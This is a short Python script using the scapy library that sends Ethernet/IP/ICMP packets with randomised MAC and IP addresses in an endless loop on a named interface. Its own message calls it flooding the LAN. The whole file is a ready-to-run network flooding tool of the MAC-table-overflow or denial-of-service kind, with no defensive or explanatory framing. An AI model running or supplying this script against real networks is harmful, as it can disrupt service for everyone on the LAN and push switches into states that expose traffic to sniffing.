import sys
from scapy.all import *

interface = "en0"

pkt = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"), dst=RandIP("*.*.*.*")) / \
         ICMP()

print ("Flooding LAN with random packets on interface " + interface )


try:
    while True:
        sendp(pkt, iface=interface)

except KeyboardInterrupt:
    print("Exiting.. ")
    sys.exit(0)
